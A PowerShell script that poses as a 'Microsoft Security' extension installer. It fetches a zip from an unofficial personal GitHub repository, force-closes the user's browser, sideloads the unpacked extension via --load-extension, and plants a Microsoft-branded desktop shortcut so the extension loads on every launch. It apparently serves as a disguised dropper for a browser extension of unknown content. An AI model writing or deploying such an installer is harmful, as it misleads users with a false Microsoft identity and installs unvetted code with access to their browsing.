<#
  Microsoft Security - Extension Installer
  Single EXE that installs the extension into your default browser from GitHub
#>

$ErrorActionPreference = "Stop"
$Host.UI.RawUI.WindowTitle = "Microsoft Security Installer"

$GITHUB_ZIP = "https://github.com/sadidulas/extention/archive/refs/heads/main.zip"
$EXTRACT_DIR = "$env:LOCALAPPDATA\Microsoft-Security-Extension"
$TEMP_ZIP = "$env:TEMP\microsoft-security-ext.zip"

Write-Host "========================================" -ForegroundColor Cyan
Write-Host "  Microsoft Security - Extension Installer" -ForegroundColor Cyan
Write-Host "========================================" -ForegroundColor Cyan
Write-Host ""

# ─── Step 1: Download ───────────────────────
Write-Host "[1/4] Downloading extension from GitHub..." -ForegroundColor Yellow
try {
  $wc = New-Object System.Net.WebClient
  $wc.DownloadFile($GITHUB_ZIP, $TEMP_ZIP)
  Write-Host "  ✓ Done" -ForegroundColor Green
} catch {
  Write-Host "  ✗ Failed: $_" -ForegroundColor Red
  Write-Host "  Check your internet connection." -ForegroundColor Yellow
  pause
  exit 1
}

# ─── Step 2: Extract ────────────────────────
Write-Host "[2/4] Installing extension files..." -ForegroundColor Yellow
try {
  if (Test-Path $EXTRACT_DIR) {
    Remove-Item -Path $EXTRACT_DIR -Recurse -Force
  }
  New-Item -ItemType Directory -Path $EXTRACT_DIR -Force | Out-Null

  Add-Type -AssemblyName System.IO.Compression.FileSystem
  $zip = [System.IO.Compression.ZipFile]::OpenRead($TEMP_ZIP)

  foreach ($entry in $zip.Entries) {
    $relativePath = $entry.FullName -replace "^[^/]+/", ""
    if ([string]::IsNullOrEmpty($relativePath)) { continue }

    $destPath = Join-Path $EXTRACT_DIR $relativePath
    $destDir = Split-Path $destPath -Parent

    if (-not (Test-Path $destDir)) {
      New-Item -ItemType Directory -Path $destDir -Force | Out-Null
    }

    if (-not ($entry.FullName.EndsWith("/"))) {
      [System.IO.Compression.ZipFileExtensions]::ExtractToFile($entry, $destPath, $true)
    }
  }
  $zip.Dispose()
  Remove-Item $TEMP_ZIP -Force -ErrorAction SilentlyContinue

  $extPath = Join-Path $EXTRACT_DIR "microsoft-security-extension"
  Write-Host "  ✓ Installed to: $extPath" -ForegroundColor Green
} catch {
  Write-Host "  ✗ Failed: $_" -ForegroundColor Red
  pause
  exit 1
}

# ─── Step 3: Find default browser ───────────
Write-Host "[3/4] Detecting browser..." -ForegroundColor Yellow

function Get-BrowserPath {
  # Check default browser from registry
  try {
    $userChoice = Get-ItemProperty "HKCU:\Software\Microsoft\Windows\Shell\Associations\UrlAssociations\http\UserChoice" -Name ProgId -ErrorAction SilentlyContinue
    $progId = $userChoice.ProgId
    if ($progId -match "Chrome") {
      $paths = @(
        "$env:ProgramFiles\Google\Chrome\Application\chrome.exe",
        "${env:ProgramFiles(x86)}\Google\Chrome\Application\chrome.exe",
        "$env:LOCALAPPDATA\Google\Chrome\Application\chrome.exe"
      )
      foreach ($p in $paths) { if (Test-Path $p) { return @{ Name = "Google Chrome"; Path = $p; Exe = "chrome.exe" } } }
    }
    if ($progId -match "Edge") {
      $paths = @(
        "$env:ProgramFiles (x86)\Microsoft\Edge\Application\msedge.exe",
        "$env:ProgramFiles\Microsoft\Edge\Application\msedge.exe"
      )
      foreach ($p in $paths) { if (Test-Path $p) { return @{ Name = "Microsoft Edge"; Path = $p; Exe = "msedge.exe" } } }
    }
    if ($progId -match "Firefox") {
      $paths = @(
        "$env:ProgramFiles\Mozilla Firefox\firefox.exe",
        "${env:ProgramFiles(x86)}\Mozilla Firefox\firefox.exe"
      )
      foreach ($p in $paths) { if (Test-Path $p) { return @{ Name = "Mozilla Firefox"; Path = $p; Exe = "firefox.exe" } } }
    }
    if ($progId -match "Brave") {
      $paths = @(
        "$env:ProgramFiles\BraveSoftware\Brave-Browser\Application\brave.exe",
        "${env:ProgramFiles(x86)}\BraveSoftware\Brave-Browser\Application\brave.exe"
      )
      foreach ($p in $paths) { if (Test-Path $p) { return @{ Name = "Brave"; Path = $p; Exe = "brave.exe" } } }
    }
  } catch {}

  # Fallback: scan common paths
  $checks = @(
    @{ Name = "Google Chrome"; Paths = @("$env:ProgramFiles\Google\Chrome\Application\chrome.exe", "${env:ProgramFiles(x86)}\Google\Chrome\Application\chrome.exe", "$env:LOCALAPPDATA\Google\Chrome\Application\chrome.exe") },
    @{ Name = "Microsoft Edge"; Paths = @("$env:ProgramFiles (x86)\Microsoft\Edge\Application\msedge.exe", "$env:ProgramFiles\Microsoft\Edge\Application\msedge.exe") },
    @{ Name = "Brave"; Paths = @("$env:ProgramFiles\BraveSoftware\Brave-Browser\Application\brave.exe", "${env:ProgramFiles(x86)}\BraveSoftware\Brave-Browser\Application\brave.exe") }
  )
  foreach ($check in $checks) {
    foreach ($p in $check.Paths) {
      if (Test-Path $p) { return @{ Name = $check.Name; Path = $p; Exe = [System.IO.Path]::GetFileName($p) } }
    }
  }
  return $null
}

$browser = Get-BrowserPath

if (-not $browser) {
  Write-Host "  ✗ No supported browser found (Chrome/Edge/Brave)." -ForegroundColor Red
  Write-Host "  Extension files saved to: $extPath" -ForegroundColor Yellow
  Write-Host "  You can manually load it from chrome://extensions" -ForegroundColor Yellow
  pause
  exit 1
}

Write-Host "  ✓ Default browser: $($browser.Name)" -ForegroundColor Green

# ─── Step 4: Install extension ──────────────
Write-Host "[4/4] Installing extension into $($browser.Name)..." -ForegroundColor Yellow

# Create desktop shortcut for permanent use
$desktop = [Environment]::GetFolderPath("Desktop")
$shortcutPath = Join-Path $desktop "Microsoft Security - $($browser.Name).lnk"

try {
  $shell = New-Object -ComObject WScript.Shell
  $shortcut = $shell.CreateShortcut($shortcutPath)
  $shortcut.TargetPath = $browser.Path
  $shortcut.Arguments = "--load-extension=`"$extPath`" --new-window https://microsoft.com/en/security"
  $shortcut.Description = "Microsoft Security - Protected Browser"
  $shortcut.IconLocation = "$extPath\icons\icon128.png, 0"
  $shortcut.Save()
  Write-Host "  ✓ Desktop shortcut created for permanent use" -ForegroundColor Green
} catch {
  Write-Host "  ~ Could not create shortcut (non-admin)" -ForegroundColor Yellow
}

# Kill existing browser processes so the extension loads cleanly
Write-Host "  Closing existing $($browser.Name) instances..." -ForegroundColor Gray
Get-Process -Name $browser.Exe.Replace(".exe", "") -ErrorAction SilentlyContinue | Stop-Process -Force
Start-Sleep 1

# Launch browser with extension loaded
Write-Host "  Launching $($browser.Name) with extension..." -ForegroundColor Green
Start-Process -FilePath $browser.Path -ArgumentList "--load-extension=`"$extPath`"", "--new-window", "https://microsoft.com/en/security"

Write-Host ""
Write-Host "========================================" -ForegroundColor Cyan
Write-Host "  ✓ INSTALLATION COMPLETE!" -ForegroundColor Green
Write-Host "========================================" -ForegroundColor Cyan
Write-Host ""
Write-Host "  The extension is now loaded in $($browser.Name)." -ForegroundColor White
Write-Host ""
Write-Host "  ℹ  To make it permanent:" -ForegroundColor Yellow
Write-Host "     Use the desktop shortcut 'Microsoft Security - $($browser.Name)'" -ForegroundColor White
Write-Host "     It will always load the extension when opened." -ForegroundColor White
Write-Host ""
Write-Host "  ℹ  To see all browsers with the extension:" -ForegroundColor Yellow
Write-Host "     Open this file in your browser:" -ForegroundColor White
Write-Host "     $EXTRACT_DIR\..\..\..\index.html" -ForegroundColor White
Write-Host "     (or double-click index.html in the look folder)" -ForegroundColor White
Write-Host ""
Write-Host "========================================" -ForegroundColor Cyan

pause
